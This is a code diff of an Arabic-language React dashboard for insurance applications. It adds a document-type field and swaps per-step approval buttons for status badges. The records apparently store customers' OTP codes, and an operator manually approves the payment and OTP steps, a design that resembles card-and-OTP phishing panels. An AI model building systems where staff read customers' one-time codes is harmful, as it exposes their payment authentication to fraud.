@@ -20,6 +20,7 @@ interface Application {
   full_name: string;
   phone: string;
   insurance_type: string;
+  document_type: string;
   vehicle_manufacturer: string;
   vehicle_model: string;
   vehicle_year: string;
@@ -174,76 +175,20 @@ const DashboardApplications = () => {
             </div>
 
             <div className="mt-4 pt-4 border-t">
-              <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
-                <div>
-                  <p className="text-xs text-muted-foreground mb-1">الخطوة 1</p>
-                  {getStepBadge(app.step_1_approved)}
-                  {!app.step_1_approved && (
-                    <Button
-                      onClick={() => approveStep(app.id, 'step_1_approved')}
-                      size="sm"
-                      className="mt-2 w-full"
-                    >
-                      موافقة
-                    </Button>
-                  )}
-                </div>
-
-                <div>
-                  <p className="text-xs text-muted-foreground mb-1">الخطوة 2</p>
-                  {getStepBadge(app.step_2_approved)}
-                  {!app.step_2_approved && app.current_step === 'vehicle_info' && (
-                    <Button
-                      onClick={() => approveStep(app.id, 'step_2_approved')}
-                      size="sm"
-                      className="mt-2 w-full"
-                    >
-                      موافقة
-                    </Button>
-                  )}
-                </div>
-
-                <div>
-                  <p className="text-xs text-muted-foreground mb-1">الخطوة 3</p>
-                  {getStepBadge(app.step_3_approved)}
-                  {!app.step_3_approved && app.current_step === 'insurance_selection' && (
-                    <Button
-                      onClick={() => approveStep(app.id, 'step_3_approved')}
-                      size="sm"
-                      className="mt-2 w-full"
-                    >
-                      موافقة
-                    </Button>
-                  )}
-                </div>
-
-                <div>
-                  <p className="text-xs text-muted-foreground mb-1">الدفع</p>
-                  {getStepBadge(app.payment_approved)}
-                  {!app.payment_approved && app.current_step === 'payment' && (
-                    <Button
-                      onClick={() => approveStep(app.id, 'payment_approved')}
-                      size="sm"
-                      className="mt-2 w-full"
-                    >
-                      موافقة
-                    </Button>
-                  )}
-                </div>
-
-                <div>
-                  <p className="text-xs text-muted-foreground mb-1">OTP</p>
-                  {getStepBadge(app.otp_approved)}
-                  {!app.otp_approved && app.current_step === 'otp' && app.otp_code && (
-                    <Button
-                      onClick={() => approveStep(app.id, 'otp_approved')}
-                      size="sm"
-                      className="mt-2 w-full"
-                    >
-                      موافقة
-                    </Button>
-                  )}
-                </div>
+              <div className="flex gap-3 items-center">
+                <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
+                  الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
+                </Badge>
+                {app.current_step === 'payment' && !app.payment_approved && (
+                  <Badge variant="outline" className="bg-orange-100 dark:bg-orange-950">
+                    في انتظار موافقة الدفع 💳
+                  </Badge>
+                )}
+                {app.current_step === 'otp' && !app.otp_approved && (
+                  <Badge variant="outline" className="bg-blue-100 dark:bg-blue-950">
+                    في انتظار موافقة OTP 🔐
+                  </Badge>
+                )}
               </div>
             </div>
           </Card>
@@ -263,12 +208,25 @@ const DashboardApplications = () => {
           {selectedApp && (
             <div className="space-y-6">
               {/* معلومات العميل */}
-              <div>
-                <h3 className="font-bold mb-2">معلومات العميل</h3>
-                <div className="grid grid-cols-2 gap-2 text-sm">
-                  <p><span className="font-semibold">الاسم:</span> {selectedApp.full_name}</p>
-                  <p><span className="font-semibold">الهاتف:</span> {selectedApp.phone}</p>
-                  <p><span className="font-semibold">نوع التأمين:</span> {selectedApp.insurance_type}</p>
+              <div className="bg-blue-50 dark:bg-blue-950/20 p-4 rounded-lg border border-blue-200 dark:border-blue-800">
+                <h3 className="font-bold mb-3 text-lg">👤 معلومات العميل</h3>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                  <div>
+                    <p className="text-xs text-muted-foreground mb-1">الاسم الكامل:</p>
+                    <p className="font-semibold text-base">{selectedApp.full_name || 'غير متوفر'}</p>
+                  </div>
+                  <div>
+                    <p className="text-xs text-muted-foreground mb-1">رقم الهاتف:</p>
+                    <p className="font-semibold text-base" dir="ltr">{selectedApp.phone || 'غير متوفر'}</p>
+                  </div>
+                  <div>
+                    <p className="text-xs text-muted-foreground mb-1">نوع التأمين:</p>
+                    <p className="font-semibold text-base">{selectedApp.insurance_type || 'غير متوفر'}</p>
+                  </div>
+                  <div>
+                    <p className="text-xs text-muted-foreground mb-1">نوع المستند:</p>
+                    <p className="font-semibold text-base">{selectedApp.document_type || 'غير متوفر'}</p>
+                  </div>
                 </div>
               </div>
 
